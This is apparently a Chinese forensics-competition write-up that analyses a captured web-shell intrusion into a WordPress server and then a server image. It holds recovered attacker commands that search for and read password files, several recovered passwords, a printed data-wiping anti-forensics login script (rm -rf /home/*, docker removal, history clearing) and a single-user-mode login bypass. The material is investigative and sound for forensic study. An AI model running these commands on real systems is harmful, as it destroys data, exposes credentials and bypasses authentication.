&#x27;LOGGED_IN_SALT&#x27;,   &#x27;i5mQPmUUfw5/o$R~pD`7[n;eKsc,4EZYwJ=LK+ZFB$T#yveH4v[77,kgqJYK5ay2&#x27; );</span><br><span class="line">define( &#x27;NONCE_SALT&#x27;,       &#x27;ySv,H] JxxE`~|sm6KxGE*ysT]bJ8kSbir(Z&gt;|BMvW` NeM;;JGc,gt3oS3++N24&#x27; );</span><br><span class="line"></span><br><span class="line">/**#@-*/</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * WordPress 数据表前缀。</span><br><span class="line"> *</span><br><span class="line"> * 如果您为每个安装分配一个唯一前缀，您可以在一个数据库中拥有多个安装。</span><br><span class="line"> * 请只使用数字、字母和下划线！</span><br><span class="line"> */</span><br><span class="line">$table_prefix = &#x27;wp_&#x27;;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 开发者专用：WordPress 调试模式。</span><br><span class="line"> *</span><br><span class="line"> * 将此值更改为 true 以启用开发过程中的通知显示。</span><br><span class="line"> * 强烈建议插件和主题开发人员在其开发环境中使用 WP_DEBUG。</span><br><span class="line"> *</span><br><span class="line"> * 有关可用于调试的其他常量的信息，请访问文档。</span><br><span class="line"> *</span><br><span class="line"> * @link https://wordpress.org/documentation/article/debugging-in-wordpress/</span><br><span class="line"> */</span><br><span class="line">define( &#x27;WP_DEBUG&#x27;, false );</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 简体中文专属：ICP 备案号显示</span><br><span class="line"> *</span><br><span class="line"> * 在设置 → 常规中设置你的 ICP 备案号。</span><br><span class="line"> * 可调用简码 [cn_icp] 或函数 cn_icp() 显示。</span><br><span class="line"> *</span><br><span class="line"> * @since 6.5.0</span><br><span class="line"> * @link https://cn.wordpress.org/support/i10n-features/</span><br><span class="line"> */</span><br><span class="line">define( &#x27;CN_ICP&#x27;, true );</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 简体中文专属：公安备案号显示</span><br><span class="line"> *</span><br><span class="line"> * 在设置 → 常规中设置你的公安备案号。</span><br><span class="line"> * 可调用简码 [cn_ga] 或函数 cn_ga() 显示。</span><br><span class="line"> *</span><br><span class="line"> * @since 6.5.0</span><br><span class="line"> * @link https://cn.wordpress.org/support/i10n-features/</span><br><span class="line"> */</span><br><span class="line">define( &#x27;CN_GA&#x27;, true );</span><br><span class="line"></span><br><span class="line">/* 在这行和「停止编辑」行之间添加任何自定义值。 */</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">/* 就这样，停止编辑！祝您使用愉快。 */</span><br><span class="line"></span><br><span class="line">/** WordPress 目录的绝对路径。 */</span><br><span class="line">if ( ! defined( &#x27;ABSPATH&#x27; ) ) &#123;</span><br><span class="line">define( &#x27;ABSPATH&#x27;, __DIR__ . &#x27;/&#x27; );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/** 设置 WordPress 变量和包含的文件。 */</span><br><span class="line">require_once ABSPATH . &#x27;wp-settings.php&#x27;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h6 id="20450"><a href="#20450" class="headerlink" title="20450"></a>20450</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /www/wwwroot/192.168.209.147 ;mysql -u192_168_209_147 -p </span><br><span class="line">success</span><br></pre></td></tr></table></figure><h6 id="20714"><a href="#20714" class="headerlink" title="20714"></a>20714</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /www/wwwroot/192.168.209.147 ;ls </span><br><span class="line"></span><br><span class="line">index.php</span><br><span class="line">license.txt</span><br><span class="line">readme.html</span><br><span class="line">shell.php</span><br><span class="line">up_load.html</span><br><span class="line">up_load.php</span><br><span class="line">uploaded_img</span><br><span class="line">wordpress</span><br><span class="line">wordpress-6.6.1-zh_CN.zip</span><br><span class="line">wp-activate.php</span><br><span class="line">wp-admin</span><br><span class="line">wp-blog-header.php</span><br><span class="line">wp-comments-post.php</span><br><span class="line">wp-config-sample.php</span><br><span class="line">wp-config.php</span><br><span class="line">wp-content</span><br><span class="line">wp-cron.php</span><br><span class="line">wp-includes</span><br><span class="line">wp-links-opml.php</span><br><span class="line">wp-load.php</span><br><span class="line">wp-login.php</span><br><span class="line">wp-mail.php</span><br><span class="line">wp-settings.php</span><br><span class="line">wp-signup.php</span><br><span class="line">wp-trackback.php</span><br><span class="line">xmlrpc.php</span><br></pre></td></tr></table></figure><h6 id="27262"><a href="#27262" class="headerlink" title="27262"></a>27262</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /www/wwwroot/192.168.209.147 ;find / -name &#x27;pass&#x27; 2&gt;/dev/null </span><br><span class="line">success</span><br></pre></td></tr></table></figure><h6 id="27579"><a href="#27579" class="headerlink" title="27579"></a>27579</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd find / -name &#x27;pass&#x27; 2 ;/dev/null grep -l &quot;pass&quot; &#123;&#125; + </span><br><span class="line">success</span><br></pre></td></tr></table></figure><h6 id="28067、28086、28101、28118、28135、28150、28170……"><a href="#28067、28086、28101、28118、28135、28150、28170……" class="headerlink" title="28067、28086、28101、28118、28135、28150、28170……"></a>28067、28086、28101、28118、28135、28150、28170……</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[?2004hwww@ubuntu:/www/wwwroot/192.168.209.147/uploaded_img$ </span><br></pre></td></tr></table></figure><h6 id="29743、29814"><a href="#29743、29814" class="headerlink" title="29743、29814"></a>29743、29814</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /www/wwwroot/192.168.209.147/uploaded_img/ ;find / -name &quot;*pass*&quot; 2&gt;/dev/null &gt; files </span><br><span class="line"></span><br><span class="line">cd /www/wwwroot/192.168.209.147/uploaded_img/ ;cat files </span><br><span class="line"></span><br><span class="line">/sys/devices/system/cpu/vulnerabilities/spec_store_bypass /sys/module/libata/parameters/atapi_passthru16 /usr/src/linux-headers-6.8.0-39/scripts/gcc-plugins/gcc-generate-rtl-pass.h /usr/src/linux-headers-6.8.0-39/scripts/gcc-plugins/gcc-generate-simple_ipa-pass.h /usr/src/linux-headers-6.8.0-39/scripts/gcc-plugins/gcc-generate-gimple-pass.h /usr/src/linux-headers-6.8.0-39/scripts/gcc-plugins/gcc-generate-ipa-pass.h /usr/src/linux-headers-6.8.0-39/tools/testing/selftests/net/test_vxlan_nolocalbypass.sh /usr/src/linux-headers-6.8.0-39/include/dt-bindings/clock/qcom,lpassaudiocc-sc7280.h /usr/src/linux-headers-6.8.0-39/include/dt-bindings/clock/qcom,lpass-sc7280.h /usr/src/linux-headers-6.8.0-39/include/dt-bindings/clock/qcom,sm8250-lpass-aoncc.h /usr/src/linux-headers-6.8.0-39/include/dt-bindings/clock/qcom,sc8280xp-lpasscc.h /usr/src/linux-headers-6.8.0-39/include/dt-bindings/clock/qcom,lpasscorecc-sc7180.h /usr/src/linux-headers-6.8.0-39/include/dt-bindings/clock/qcom,lpasscorecc-sc7280.h /usr/src/linux-headers-6.8.0-39/include/dt-bindings/clock/qcom,lpass-sdm845.h /usr/src/linux-headers-6.8.0-39/include/dt-bindings/clock/qcom,sm8250-lpass-audiocc.h /usr/src/linux-headers-6.8.0-39/include/dt-bindings/sound/sc7180-lpass.h /usr/src/linux-headers-6.8.0-39/include/dt-bindings/sound/apq8016-lpass.h /usr/src/linux-headers-6.8.0-39/include/dt-bindings/sound/qcom,lpass.h /usr/src/linux-headers-6.8.0-39/include/dt-bindings/sound/qcom,q6dsp-lpass-ports.h /usr/src/linux-headers-6.8.0-39/include/linux/irqbypass.h /usr/bin/passwd /usr/bin/gpasswd /usr/bin/sg_emc_trespass /usr/bin/systemd-tty-ask-password-agent /usr/bin/grub-mkpasswd-pbkdf2 /usr/bin/systemd-ask-password /usr/bin/htpasswd /usr/sbin/update-passwd /usr/sbin/chpasswd /usr/sbin/chgpasswd /usr/share/doc-base/base-passwd.users-and-groups /usr/share/vim/vim91/ftplugin/passwd.vim /usr/share/vim/vim91/syntax/passwd.vim /usr/share/mime/application/vnd.apple.pkpass.xml /usr/share/lintian/overrides/passwd /usr/share/lintian/overrides/base-passwd /usr/share/bash-completion/completions/mmsitepass /usr/share/bash-completion/completions/passwd /usr/share/bash-completion/completions/chpasswd /usr/share/bash-completion/completions/gpasswd /usr/share/bash-completion/completions/ldappasswd /usr/share/bash-completion/completions/grub-mkpasswd-pbkdf2 /usr/share/bash-completion/completions/smbpasswd /usr/share/bash-completion/completions/htpasswd /usr/share/initramfs-tools/hooks/cryptpassdev /usr/share/base-passwd /usr/share/base-passwd/passwd.master /usr/share/awk/passwd.awk /usr/share/awk/ns_passwd.awk /usr/share/rubygems-integration/all/gems/webrick-1.8.1/lib/webrick/httpauth/htpasswd.rb /usr/share/ca-certificates/mozilla/Buypass_Class_2_Root_CA.crt /usr/share/ca-certificates/mozilla/Buypass_Class_3_Root_CA.crt /usr/share/man/zh_CN/man1/passwd.1.gz /usr/share/man/zh_CN/man1/gpasswd.1.gz /usr/share/man/zh_CN/man5/passwd.5.gz /usr/share/man/zh_CN/man8/chpasswd.8.gz /usr/share/man/zh_CN/man8/chgpasswd.8.gz /usr/share/man/man7/passphrase-encoding.7ssl.gz /usr/share/man/fr/man1/passwd.1.gz /usr/share/man/fr/man1/gpasswd.1.gz /usr/share/man/fr/man5/passwd.5.gz /usr/share/man/fr/man8/chpasswd.8.gz /usr/share/man/fr/man8/update-passwd.8.gz /usr/share/man/fr/man8/chgpasswd.8.gz /usr/share/man/man1/openssl-passphrase-options.1ssl.gz /usr/share/man/man1/systemd-ask-password.1.gz /usr/share/man/man1/systemd-tty-ask-password-agent.1.gz /usr/share/man/man1/passwd.1.gz /usr/share/man/man1/grub-mkpasswd-pbkdf2.1.gz /usr/share/man/man1/htpasswd.1.gz /usr/share/man/man1/openssl-passwd.1ssl.gz /usr/share/man/man1/gpasswd.1.gz /usr/share/man/man1/gpg-preset-passphrase.1.gz /usr/share/man/man1/passwd.1ssl.gz /usr/share/man/cs/man1/gpasswd.1.gz /usr/share/man/cs/man5/passwd.5.gz /usr/share/man/man3/selinux_check_passwd_access.3.gz /usr/share/man/man3/libssh2_userauth_password_ex.3.gz /usr/share/man/man3/sasl_setpass.3.gz /usr/share/man/man3/passwd2des.3.gz /usr/share/man/man3/sasl_server_userdb_checkpass_t.3.gz /usr/share/man/man3/libssh2_userauth_password.3.gz /usr/share/man/man3/zip_set_default_password.3.gz /usr/share/man/man3/sasl_checkpass.3.gz /usr/share/man/man3/sasl_server_userdb_setpass_t.3.gz /usr/share/man/man3/getpass.3.gz /usr/share/man/ko/man5/passwd.5.gz /usr/share/man/sv/man1/passwd.1.gz /usr/share/man/sv/man5/passwd.5.gz /usr/share/man/ja/man1/passwd.1.gz /usr/share/man/ja/man1/gpasswd.1.gz /usr/share/man/ja/man5/passwd.5.gz /usr/share/man/ja/man8/chpasswd.8.gz /usr/share/man/ja/man8/update-passwd.8.gz /usr/share/man/de/man1/passwd.1.gz /usr/share/man/de/man1/gpasswd.1.gz /usr/share/man/de/man5/passwd.5.gz /usr/share/man/de/man8/chpasswd.8.gz /usr/share/man/de/man8/update-passwd.8.gz /usr/share/man/de/man8/chgpasswd.8.gz /usr/share/man/es/man8/update-passwd.8.gz /usr/share/man/pl/man8/update-passwd.8.gz /usr/share/man/it/man1/passwd.1.gz /usr/share/man/it/man1/gpasswd.1.gz /usr/share/man/it/man5/passwd.5.gz /usr/share/man/it/man8/chpasswd.8.gz /usr/share/man/it/man8/chgpasswd.8.gz /usr/share/man/ru/man1/passwd.1.gz /usr/share/man/ru/man1/gpasswd.1.gz /usr/share/man/ru/man5/passwd.5.gz /usr/share/man/ru/man8/chpasswd.8.gz /usr/share/man/ru/man8/update-passwd.8.gz /usr/share/man/ru/man8/chgpasswd.8.gz /usr/share/man/tr/man1/passwd.1.gz /usr/share/man/tr/man5/passwd.5.gz /usr/share/man/man5/passwd.5.gz /usr/share/man/hu/man1/passwd.1.gz /usr/share/man/hu/man1/gpasswd.1.gz /usr/share/man/hu/man5/passwd.5.gz /usr/share/man/man8/systemd-ask-password-console.path.8.gz /usr/share/man/man8/chpasswd.8.gz /usr/share/man/man8/systemd-ask-password-console.service.8.gz /usr/share/man/man8/systemd-ask-password-wall.path.8.gz /usr/share/man/man8/update-passwd.8.gz /usr/share/man/man8/systemd-ask-password-wall.service.8.gz /usr/share/man/man8/chgpasswd.8.gz /usr/share/man/man8/sg_emc_trespass.8.gz /usr/share/man/uk/man1/passwd.1.gz /usr/share/man/uk/man1/gpasswd.1.gz /usr/share/man/uk/man5/passwd.5.gz /usr/share/man/uk/man8/chpasswd.8.gz /usr/share/man/uk/man8/chgpasswd.8.gz /usr/share/man/pt_BR/man1/gpasswd.1.gz /usr/share/man/pt_BR/man5/passwd.5.gz /usr/share/man/zh_TW/man5/passwd.5.gz /usr/share/man/zh_TW/man8/chpasswd.8.gz /usr/share/doc/libpam0g-dev/examples/vpass.c /usr/share/doc/passwd /usr/share/doc/passwd/examples/passwd.expire.cron /usr/share/doc/gawk/examples/lib/passwdawk.in /usr/share/doc/gawk/examples/lib/ns_passwd.awk /usr/share/doc/base-passwd /usr/share/doc/libvpx-dev/examples/twopass_encoder.c /usr/share/doc/re2c/examples/c/submatch/parse_etc_passwd.c /usr/share/doc/re2c/examples/c/submatch/parse_etc_passwd.re /usr/share/pam/common-password.md5sums /usr/share/pam/common-password /usr/include/mit-krb5/kadm5/chpass_util_strings.h /usr/include/glib-2.0/gio/gtlspassword.h /usr/include/kadm5/chpass_util_strings.h /usr/lib/modules/6.8.0-39-generic/kernel/virt/lib/irqbypass.ko.zst /usr/lib/modules/6.8.0-39-generic/kernel/sound/soc/codecs/snd-soc-lpass-tx-macro.ko.zst /usr/lib/modules/6.8.0-39-generic/kernel/sound/soc/codecs/snd-soc-lpass-rx-macro.ko.zst /usr/lib/modules/6.8.0-39-generic/kernel/sound/soc/codecs/snd-soc-lpass-macro-common.ko.zst /usr/lib/modules/6.8.0-39-generic/kernel/sound/soc/codecs/snd-soc-lpass-wsa-macro.ko.zst /usr/lib/modules/6.8.0-39-generic/kernel/sound/soc/codecs/snd-soc-lpass-va-macro.ko.zst /usr/lib/gnupg2/gpg-preset-passphrase /usr/lib/cryptsetup/askpass /usr/lib/cryptsetup/scripts/passdev /usr/lib/tmpfiles.d/passwd.conf /usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py /usr/lib/python3/dist-packages/cloudinit/config/__pycache__/cc_set_passwords.cpython-312.pyc /usr/lib/python3/dist-packages/cloudinit/sources/helpers/vmware/imc/config_passwd.py /usr/lib/python3/dist-packages/cloudinit/sources/helpers/vmware/imc/__pycache__/config_passwd.cpython-312.pyc /usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py /usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-312.pyc /usr/lib/python3.12/getpass.py /usr/lib/python3.12/__pycache__/getpass.cpython-312.pyc /usr/lib/x86_64-linux-gnu/libmariadb3/plugin/sha256_password.so /usr/lib/x86_64-linux-gnu/libmariadb3/plugin/caching_sha2_password.so /usr/lib/x86_64-linux-gnu/libmariadb3/plugin/mysql_clear_password.so /usr/lib/gnupg/gpg-preset-passphrase /usr/lib/apache2/modules/mod_proxy_fdpass.so /usr/lib/grub/i386-pc/password.mod /usr/lib/grub/i386-pc/legacy_password_test.mod /usr/lib/grub/i386-pc/password_pbkdf2.mod /usr/lib/systemd/system/sysinit.target.wants/systemd-ask-password-console.path /usr/lib/systemd/system/multi-user.target.wants/systemd-ask-password-wall.path /usr/lib/systemd/system/systemd-ask-password-console.service /usr/lib/systemd/system/systemd-ask-password-plymouth.service /usr/lib/systemd/system/systemd-ask-password-wall.path /usr/lib/systemd/system/systemd-ask-password-plymouth.path /usr/lib/systemd/system/systemd-ask-password-console.path /usr/lib/systemd/system/systemd-ask-password-wall.service /usr/lib/systemd/systemd-reply-password /usr/local/openssl111/share/man/man7/passphrase-encoding.7 /usr/local/openssl111/share/man/man1/passwd.1 /usr/local/openssl111/share/man/man1/openssl-passwd.1 /usr/local/openssl111/share/man/man3/pem_password_cb.3 /usr/local/openssl111/share/man/man3/SSL_CTX_get_default_passwd_cb.3 /usr/local/openssl111/share/man/man3/SSL_CTX_get_default_passwd_cb_userdata.3 /usr/local/openssl111/share/man/man3/SSL_get_default_passwd_cb.3 /usr/local/openssl111/share/man/man3/PKCS12_newpass.3 /usr/local/openssl111/share/man/man3/SSL_set_default_passwd_cb_userdata.3 /usr/local/openssl111/share/man/man3/SSL_get_default_passwd_cb_userdata.3 /usr/local/openssl111/share/man/man3/SSL_CTX_set_default_passwd_cb.3 /usr/local/openssl111/share/man/man3/EVP_PKEY_CTX_set1_pbe_pass.3 /usr/local/openssl111/share/man/man3/SSL_CTX_set_default_passwd_cb_userdata.3 /usr/local/openssl111/share/man/man3/SSL_set_default_passwd_cb.3 /usr/local/openssl111/share/doc/openssl/html/man7/passphrase-encoding.html /usr/local/openssl111/share/doc/openssl/html/man1/passwd.html /usr/local/openssl111/share/doc/openssl/html/man1/openssl-passwd.html /usr/local/openssl111/share/doc/openssl/html/man3/PKCS12_newpass.html /usr/local/openssl111/share/doc/openssl/html/man3/EVP_PKEY_CTX_set1_pbe_pass.html /usr/local/openssl111/share/doc/openssl/html/man3/SSL_CTX_get_default_passwd_cb_userdata.html /usr/local/openssl111/share/doc/openssl/html/man3/SSL_get_default_passwd_cb.html /usr/local/openssl111/share/doc/openssl/html/man3/SSL_set_default_passwd_cb.html /usr/local/openssl111/share/doc/openssl/html/man3/SSL_set_default_passwd_cb_userdata.html /usr/local/openssl111/share/doc/openssl/html/man3/SSL_get_default_passwd_cb_userdata.html /usr/local/openssl111/share/doc/openssl/html/man3/SSL_CTX_set_default_passwd_cb_userdata.html /usr/local/openssl111/share/doc/openssl/html/man3/pem_password_cb.html /usr/local/openssl111/share/doc/openssl/html/man3/SSL_CTX_set_default_passwd_cb.html /usr/local/openssl111/share/doc/openssl/html/man3/SSL_CTX_get_default_passwd_cb.html /usr/local/openssl/man/man1/passwd.1 /usr/local/openssl/man/man1/openssl-passwd.1 /usr/local/openssl/man/man3/des_read_password.3 /usr/local/openssl/man/man3/des_read_2passwords.3 /usr/local/openssl/man/man3/SSL_CTX_set_default_passwd_cb.3 /usr/local/openssl/man/man3/SSL_CTX_set_default_passwd_cb_userdata.3 /etc/apparmor.d/1password /etc/apparmor.d/MongoDB_Compass /etc/apparmor.d/abstractions/smbpass /etc/ssl/certs/Buypass_Class_2_Root_CA.pem /etc/ssl/certs/Buypass_Class_3_Root_CA.pem /etc/passwd /etc/passwd- /etc/pam.d/passwd /etc/pam.d/chpasswd /etc/pam.d/common-password /etc/security/opasswd /etc/apache2/mods-available/proxy_fdpass.load /boot/grub/i386-pc/legacy_password_test.mod /boot/grub/i386-pc/password.mod /boot/grub/i386-pc/password_pbkdf2.mod /tmp/tmppass /www/wwwroot/192.168.209.147/wp-includes/class-phpass.php /www/wwwroot/192.168.209.147/wp-includes/class-wp-application-passwords.php /www/wwwroot/192.168.209.147/wp-includes/rest-api/endpoints/class-wp-rest-application-passwords-controller.php /www/wwwroot/192.168.209.147/wp-admin/includes/class-wp-application-passwords-list-table.php /www/wwwroot/192.168.209.147/wp-admin/js/password-strength-meter.js /www/wwwroot/192.168.209.147/wp-admin/js/application-passwords.js /www/wwwroot/192.168.209.147/wp-admin/js/password-toggle.min.js /www/wwwroot/192.168.209.147/wp-admin/js/password-strength-meter.min.js /www/wwwroot/192.168.209.147/wp-admin/js/application-passwords.min.js /www/wwwroot/192.168.209.147/wp-admin/js/password-toggle.js /www/server/pure-ftpd/etc/pureftpd.passwd /www/server/php/82/include/php/ext/mbstring/libmbfl/mbfl/mbfilter_pass.h /www/server/php/82/include/php/ext/standard/php_password.h /www/server/mysql/include/mysql/get_password.h /www/server/mysql/include/mysql/service_mysql_password_policy.h /www/server/mysql/include/mysql/plugin_validate_password.h /www/server/mysql/include/plugin_validate_password.h /www/server/mysql/lib/plugin/validate_password.so /var/cache/debconf/passwords.dat /var/lib/dpkg/info/base-passwd.md5sums /var/lib/dpkg/info/passwd.postrm /var/lib/dpkg/info/passwd.md5sums /var/lib/dpkg/info/base-passwd.templates /var/lib/dpkg/info/base-passwd.list /var/lib/dpkg/info/passwd.list /var/lib/dpkg/info/passwd.postinst /var/lib/dpkg/info/base-passwd.postrm /var/lib/dpkg/info/passwd.conffiles /var/lib/dpkg/info/passwd.prerm /var/lib/dpkg/info/base-passwd.preinst /var/lib/dpkg/info/base-passwd.postinst /var/lib/dpkg/info/passwd.preinst /var/lib/cloud/instances/iid-datasource-none/sem/config_set_passwords /var/lib/pam/password /run/systemd/ask-password </span><br></pre></td></tr></table></figure><h6 id="29854、29862"><a href="#29854、29862" class="headerlink" title="29854、29862"></a>29854、29862</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /www/wwwroot/192.168.209.147/uploaded_img/ ;cat /tmp/tmppass </span><br><span class="line"></span><br><span class="line">passwd!@# </span><br><span class="line"></span><br><span class="line">cd /www/wwwroot/192.168.209.147/uploaded_img/ ;clear </span><br></pre></td></tr></table></figure><h5 id="7-分析流量包检材，服务器php配置文件的存放位置（标准格式：-www-sev-php-ini）"><a href="#7-分析流量包检材，服务器php配置文件的存放位置（标准格式：-www-sev-php-ini）" class="headerlink" title="7  分析流量包检材，服务器php配置文件的存放位置（标准格式：&#x2F;www&#x2F;sev&#x2F;php.ini）"></a>7  分析流量包检材，服务器php配置文件的存放位置（标准格式：&#x2F;www&#x2F;sev&#x2F;php.ini）</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><p>看大哥的wp写的是&#x2F;www&#x2F;server&#x2F;php&#x2F;82&#x2F;etc&#x2F;php.ini，没找到在哪，我太菜了</p><h5 id="8-分析流量包检材，被攻击的web环境其数据库密码是。（标准格式：qwer1234）"><a href="#8-分析流量包检材，被攻击的web环境其数据库密码是。（标准格式：qwer1234）" class="headerlink" title="8  分析流量包检材，被攻击的web环境其数据库密码是。（标准格式：qwer1234）"></a>8  分析流量包检材，被攻击的web环境其数据库密码是。（标准格式：qwer1234）</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X847Z3QzF1a6MHjR</span><br></pre></td></tr></table></figure><h5 id="9-分析流量包检材，服务器管理存放临时登录密码的位置。（标准格式：-tmp-pass）"><a href="#9-分析流量包检材，服务器管理存放临时登录密码的位置。（标准格式：-tmp-pass）" class="headerlink" title="9  分析流量包检材，服务器管理存放临时登录密码的位置。（标准格式：&#x2F;tmp&#x2F;pass）"></a>9  分析流量包检材，服务器管理存放临时登录密码的位置。（标准格式：&#x2F;tmp&#x2F;pass）</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/tmp/tmppass</span><br></pre></td></tr></table></figure><h5 id="10-分析流量包检材，黑客获取的高权限主机的登录密码。（标准格式：qwer1234）"><a href="#10-分析流量包检材，黑客获取的高权限主机的登录密码。（标准格式：qwer1234）" class="headerlink" title="10  分析流量包检材，黑客获取的高权限主机的登录密码。（标准格式：qwer1234）"></a>10  分析流量包检材，黑客获取的高权限主机的登录密码。（标准格式：qwer1234）</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">passwd!@#</span><br></pre></td></tr></table></figure><h4 id="服务器取证"><a href="#服务器取证" class="headerlink" title="服务器取证"></a>服务器取证</h4><h5 id="网站重构-1"><a href="#网站重构-1" class="headerlink" title="网站重构"></a>网站重构</h5><p>记得启动容器</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427983.png" alt="image-20241005231530043"></p><p>分析日志可以看见网站之前使用的是mysql</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427984.png" alt="image-20241005230806264"></p><p>故不能被mongo误导了- -，mysql密码root123456</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427985.png" alt="image-20241005231211450"></p><p>修改数据库配置文件</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427986.png" alt="image-20241005231239363"></p><p>导出mongo数据库为csv文件</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427987.png" alt="image-20241005231349510"></p><p>再导入到mysql数据库</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427988.png" alt="image-20241005231416211"></p><p>网站成功访问</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427989.png" alt="image-20241005231539138"></p><p>后台</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427990.png" alt="image-20241005232052448"></p><p>修改登录逻辑</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427991.png" alt="image-20241005233428842"></p><p>登录成功</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427992.png" alt="image-20241005233423127"></p><p>后台里很多页面报错，缺了表或者查询语句有误。</p><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20241006141133851.png" alt="image-20241006141133851"></p><h5 id="1-分析服务器检材，服务器会做登录密码验证，该登录验证文件位置在？-标准格式：-xxx-xxx-xxx-xxx"><a href="#1-分析服务器检材，服务器会做登录密码验证，该登录验证文件位置在？-标准格式：-xxx-xxx-xxx-xxx" class="headerlink" title="1  分析服务器检材，服务器会做登录密码验证，该登录验证文件位置在？[标准格式：&#x2F;xxx&#x2F;xxx&#x2F;xxx.xxx]"></a>1  分析服务器检材，服务器会做登录密码验证，该登录验证文件位置在？[标准格式：&#x2F;xxx&#x2F;xxx&#x2F;xxx.xxx]</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/profile.d/check-system.sh</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427993.png" alt="image-20241005200318372"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/.cadpc</span><br><span class="line">4e5f8b3141fba19274789df7cfca39d96dd60b76e9d843c41ec37bbd366fd7e3</span><br><span class="line"></span><br><span class="line">/etc/profile.d/check-system.sh</span><br><span class="line">#!/usr/bin/env bash</span><br><span class="line">OLD=&quot;&quot;</span><br><span class="line">if [ -f /etc/.cadpc ]; then</span><br><span class="line">OLD=&quot;$(cat /etc/.cadpc)&quot;</span><br><span class="line">fi</span><br><span class="line">CURRENT=&quot;$(cat /etc/shadow | sha256sum | awk -F &#x27; &#x27; &#x27;&#123;print $1&#125;&#x27;)&quot;</span><br><span class="line">if [ &quot;$OLD&quot; != &quot;$CURRENT&quot; ]; then  </span><br><span class="line">echo &quot;Illegal login detected!!!&quot;  </span><br><span class="line">rm -rf /etc/profile.d/check-system.sh  </span><br><span class="line">docker rm -f $(docker ps -aq)  </span><br><span class="line">rm -rf /opt/proxy/  </span><br><span class="line">rm -rf /opt/install.sh </span><br><span class="line">    rm -rf /root/ntp-tunnel  </span><br><span class="line">    rm -rf /root/sock5-tunnel  </span><br><span class="line">    rm -rf /home/*  </span><br><span class="line">    rm -rf /root/.docker/config.json  </span><br><span class="line">    docker image prune -af  </span><br><span class="line">    cat /dev/null &gt; ~/.bash_history  </span><br><span class="line">    echo &quot;&quot; &gt; ~/.bashrc  </span><br><span class="line">    hostnamectl set-hostname localhost  </span><br><span class="line">    history -c</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427994.png" alt="image-20241005200810694"></p><p>服务器仿真会重置密码为123456，所以改变&#x2F;etc&#x2F;shadow的sha256哈希值，判断原sha256值和当前sha256值不同，导致登陆为非法登陆，然后执行下面的删除和修改操作</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;Illegal login detected!!!&quot;  </span><br><span class="line">rm -rf /etc/profile.d/check-system.sh  </span><br><span class="line">docker rm -f $(docker ps -aq)  </span><br><span class="line">rm -rf /opt/proxy/  </span><br><span class="line">rm -rf /opt/install.sh </span><br><span class="line">rm -rf /root/ntp-tunnel  </span><br><span class="line">rm -rf /root/sock5-tunnel  </span><br><span class="line">rm -rf /home/*  </span><br><span class="line">rm -rf /root/.docker/config.json  </span><br><span class="line">docker image prune -af  </span><br><span class="line">cat /dev/null &gt; ~/.bash_history  </span><br><span class="line">echo &quot;&quot; &gt; ~/.bashrc  </span><br><span class="line">hostnamectl set-hostname localhost  </span><br><span class="line">history -c</span><br></pre></td></tr></table></figure><p>所以只要不重置密码就不会导致删除，或者是我在比赛时用的方法，登录成功立马CTRL+C，就不会导致删除和修改容器操作的，但是会删除这个脚本文件，可能是手速不够快，比赛时一直没注意登录后提示了”Illegal login detected!!!” ，所以很傻逼的研究了半天，以为是检材出问题了，或者是仿真没仿对，浪费了足足一小时</p><p><img src="https://cdn.jsdelivr.net/gh/bthcls756/photo@main/202410071427995.png" alt="image-20241005202101206"></p><p>用的比较多的方式，进单用户模式修改，开机按e，修改</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rw init=/bin/bash</span><br></pre></td></tr></table></figure><p>ctrl+x保存执行，图片不整了，累里，去看参考资料吧</p><p>然后去把检测脚本删了，还可以改root密码</p><h5 id="2-分析服务器检材，服务器ssh端口是多少？-标准格式：1234"><a href="#2-分析服务器检材，服务器ssh端口是多少？-标准格式：1234" class="headerlink" title="2  分析服务器检材，服务器ssh端口是多少？[标准格式：1234]"></a>2  分析服务器检材，服务器ssh端口是多少？[标准格式：1234]</h5><figure class="highlight 